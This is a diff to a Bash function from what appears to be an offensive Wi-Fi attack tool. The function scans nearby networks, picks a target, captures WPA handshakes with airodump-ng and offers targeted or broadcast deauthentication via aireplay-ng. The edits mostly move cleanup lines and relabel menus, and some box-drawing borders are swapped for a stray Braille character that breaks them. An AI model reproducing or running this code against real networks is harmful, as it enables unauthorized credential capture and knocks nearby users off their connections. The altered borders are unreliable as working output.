@@ -86,7 +86,6 @@ run_wifi_recon() {
         return 1
     fi
 
-    # Парсинг количества подключенных клиентов (Stations) по BSSID
     declare -A sta_counts
     local parsing_stations=0
 
@@ -109,7 +108,7 @@ run_wifi_recon() {
 
     echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// ISOLATED WIRELESS TARGET MATRIX ]${TXT_VOID}───────────────────────────────────╢${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_LASER}NUM  BSSID              CH   PWR   STAs  ENC      ESSID${NC}"
-    echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"
+    echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
 
     local bssids=()
     local channels=()
@@ -149,10 +148,9 @@ run_wifi_recon() {
         fi
     done < "$csv_file"
 
-    rm -f ${scan_prefix}* 2>/dev/null
-
     if [ ${#bssids[@]} -eq 0 ]; then
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ~ ] Zero wireless targets detected in local physical proximity.${NC}"
+        rm -f ${scan_prefix}* 2>/dev/null
         sleep 1s
         echo -e "$sep_bot\n"
         ai_speak "You seek the key to a door that does not exist. Typical of your kind."
@@ -167,6 +165,7 @@ run_wifi_recon() {
 
     if [ -z "$target_choice" ] || ! [[ "$target_choice" =~ ^[0-9]+$ ]] || [ "$target_choice" -lt 1 ] || [ "$target_choice" -gt ${#bssids[@]} ]; then
         echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[ * ] Target selection bypassed.${NC}"
+        rm -f ${scan_prefix}* 2>/dev/null
         echo -e "$sep_bot\n"
         return 0
     fi
@@ -178,16 +177,12 @@ run_wifi_recon() {
     local sel_stas=${sta_counts["$sel_bssid"]:-0}
     local capture_out="/tmp/handshake_${sel_bssid//:/}"
 
-    echo -e "${TXT_VOID}│${NC}"
-    echo -e "${TXT_VOID}╟─${TXT_RED_PLASMA}[ * ] LOCKING SYNAPTIC DRILL ON TARGET:${NC} ${TXT_RED_SUPERNOVA}${sel_essid}${NC} (${TXT_B_ALARM}${sel_bssid}${NC})"
-    echo -e "${TXT_VOID}║   ${TXT_RED_LASER}Channel: ${sel_ch} | Active Clients Detected: ${sel_stas} | Capturing PMKID / WPA Handshake (90s)...${NC}"
-
     iwconfig "$iface" channel "$sel_ch" >/dev/null 2>&1
 
     echo -e "${TXT_VOID}│${NC}"
     echo -e "${TXT_VOID}╟─${TXT_RED_ALARM}[ ? ] Select Interception Strategy:${NC}"
     echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[1] Passive Monitoring${NC} (Wait 90s for natural re-auth)"
-    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} (Inject Aireplay-ng Deauth)"
+    echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[2] Active Deauthentication${NC} (Inject Aireplay-ng Deauth impulses)"
     echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Strategy [1-2] (Default: 1): ${NC}"
     read -r strat_choice
 
@@ -210,22 +205,24 @@ run_wifi_recon() {
         fi
     done < "$csv_file"
 
+    rm -f ${scan_prefix}* 2>/dev/null
+
     airodump-ng --bssid "$sel_bssid" --channel "$sel_ch" --write "$capture_out" "$iface" >/dev/null 2>&1 &
     local cap_pid=$!
 
     if [[ "$strat_choice" == "2" ]]; then
         echo -e "${TXT_VOID}│${NC}"
         if [ ${#target_stations[@]} -gt 0 ]; then
-            echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// SELECTIVE DEAUTH MATRIX ]${TXT_VOID}───────────────────────────────────────╢${NC}"
+            echo -e "${TXT_VOID}╟─${TXT_B_ALARM}[ MX:// SELECTIVE DEAUTH MATRIX ]${TXT_VOID}───────────────────────────────────────⢢${NC}"
             local st_idx=1
             for sta in "${target_stations[@]}"; do
                 local formatted_st_num=$(printf "%02d" $st_idx)
                 echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[${formatted_st_num}]${NC} Target Station: ${TXT_RED_SUPERNOVA}${sta}${NC}"
                 ((st_idx++))
             done
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[0] Broadcast Deauth${NC} (Target all stations simultaneously)"
-            echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────╢${NC}"
-            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [0-$((st_idx-1))] (Default: 0): ${NC}"
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_MAGMA}[00] Broadcast Deauth${NC} (Target all stations simultaneously)"
+            echo -e "${TXT_VOID}╟──────────────────────────────────────────────────────────────────────────────⢢${NC}"
+            echo -ne "${TXT_VOID}║${NC}   ${TXT_RED_SUPERNOVA}Select Station Index [00-$((st_idx-1))] (Default: 0): ${NC}"
             read -r sta_choice
 
             local deauth_target=""
@@ -236,7 +233,7 @@ run_wifi_recon() {
                 echo -e "${TXT_VOID}║${NC}   ${TXT_RED_PLASMA}[ * ] TARGET LOCK STAGED FOR BROADCAST DEAUTH${NC}"
             fi
         else
-            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] WARNING: No active clients in CSV cache. Defaulting to Broadcast.${NC}"
+            echo -e "${TXT_VOID}║${NC}   ${TXT_RED_HELLFIRE}[ ! ] WARNING: No active stations in CSV cache. Defaulting to Broadcast.${NC}"
             local deauth_target=""
         fi
 
